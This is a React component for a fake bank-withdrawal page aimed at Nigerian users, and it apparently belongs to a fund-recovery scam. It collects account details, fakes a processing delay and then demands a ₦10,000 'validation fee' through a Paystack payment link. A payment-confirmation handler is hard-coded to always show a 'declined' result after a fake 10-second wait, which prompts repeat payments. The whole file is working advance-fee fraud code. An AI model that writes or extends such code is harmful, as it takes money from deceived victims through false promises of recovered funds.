import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent } from '@/components/ui/card';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { ArrowLeft, Copy, Loader2, CheckCircle, AlertCircle } from 'lucide-react';
import { nigerianBanks } from '@/utils/banks';
import { toast } from '@/hooks/use-toast';

interface WithdrawalPageProps {
  onBack: () => void;
  balance: number;
  onWithdraw: (amount: number) => void;
}

const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWithdraw }) => {
  const [accountNumber, setAccountNumber] = useState('');
  const [selectedBank, setSelectedBank] = useState('');
  const [accountName, setAccountName] = useState('');
  const [amount, setAmount] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showWithdrawalNotice, setShowWithdrawalNotice] = useState(false);
  const [showPaymentDetails, setShowPaymentDetails] = useState(false);
  const [showTransferNotice, setShowTransferNotice] = useState(false);
  const [showProcessingPayment, setShowProcessingPayment] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showDeclined, setShowDeclined] = useState(false);

  const handleProceed = () => {
    if (!accountNumber || !selectedBank || !accountName || !amount) {
      toast({
        title: "Error",
        description: "Please fill in all fields",
        duration: 3000,
      });
      return;
    }

    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setShowWithdrawalNotice(true);
    }, 3000);
  };

  const handleWithdrawalNoticeConfirm = () => {
    setShowWithdrawalNotice(false);
    toast({
      title: "Redirecting to Paystack",
      description: "You'll be redirected to complete the withdrawal validation...",
      duration: 2000,
    });
    
    setTimeout(() => {
      window.open('https://paystack.shop/pay/i0nj8tjxcp', '_blank');
      onBack();
    }, 1500);
  };

  const handleContinuePayment = () => {
    setShowTransferNotice(false);
  };

  const handlePaymentConfirm = () => {
    setShowPaymentDetails(false);
    setShowProcessingPayment(true);
    
    setTimeout(() => {
      setShowProcessingPayment(false);
      // Always show declined (as requested)
      setShowDeclined(true);
    }, 10000);
  };

  const handleSuccessClose = () => {
    setShowSuccess(false);
    onBack();
  };

  const handleDeclinedRetry = () => {
    setShowDeclined(false);
    setShowPaymentDetails(true);
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied!",
      description: `${label} copied to clipboard`,
      duration: 2000,
    });
  };

  return (
    <>
      <div className="min-h-screen bg-gray-50">
        {/* Header */}
        <div className="bg-white px-4 py-4 shadow-sm">
          <div className="flex items-center space-x-3">
            <button
              onClick={onBack}
              className="p-2 hover:bg-gray-100 rounded-full transition-colors"
            >
              <ArrowLeft className="w-6 h-6 text-gray-600" />
            </button>
            <h1 className="text-xl font-semibold text-gray-900">Withdraw To Bank Account</h1>
          </div>
        </div>

        <div className="px-4 py-6">
          <Card>
            <CardContent className="p-6 space-y-6">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Account Number</label>
                <Input
                  placeholder="Enter account number"
                  value={accountNumber}
                  onChange={(e) => setAccountNumber(e.target.value)}
                  className="w-full"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Bank Name</label>
                <Select value={selectedBank} onValueChange={setSelectedBank}>
                  <SelectTrigger className="w-full">
                    <SelectValue placeholder="Select Bank" />
                  </SelectTrigger>
                  <SelectContent>
                    {nigerianBanks.map((bank) => (
                      <SelectItem key={bank} value={bank}>
                        {bank}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Account Name</label>
                <Input
                  placeholder="Account Name"
                  value={accountName}
                  onChange={(e) => setAccountName(e.target.value)}
                  className="w-full"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Amount</label>
                <Input
                  placeholder="Enter amount"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  type="number"
                  className="w-full"
                />
              </div>

              <div className="text-center">
                <p className="text-lg font-semibold text-green-600">
                  Available Balance: ₦{balance.toLocaleString()}.00
                </p>
              </div>

              <Button
                onClick={handleProceed}
                disabled={isLoading}
                className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-full"
              >
                {isLoading ? (
                  <div className="flex items-center space-x-2">
                    <Loader2 className="w-4 h-4 animate-spin" />
                    <span>Processing...</span>
                  </div>
                ) : (
                  'Proceed'
                )}
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>

      {/* Withdrawal Notice Dialog */}
      <Dialog open={showWithdrawalNotice} onOpenChange={() => {}}>
        <DialogContent className="max-w-sm mx-auto">
          <DialogHeader>
            <DialogTitle className="text-center">Withdrawal Notice</DialogTitle>
          </DialogHeader>
          <div className="text-center py-4">
            <p className="text-gray-600 mb-4">
              Withdrawal placed. You will be paying ₦10,000 as a validation fee. This helps keep our platform running since all recovered funds are distributed to users. Click proceed to continue.
            </p>
            <div className="flex space-x-3">
              <Button variant="outline" onClick={() => setShowWithdrawalNotice(false)} className="flex-1">
                Back
              </Button>
              <Button onClick={handleWithdrawalNoticeConfirm} className="flex-1 bg-green-600 hover:bg-green-700">
                Proceed
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      
    </>
  );
};

export default WithdrawalPage;
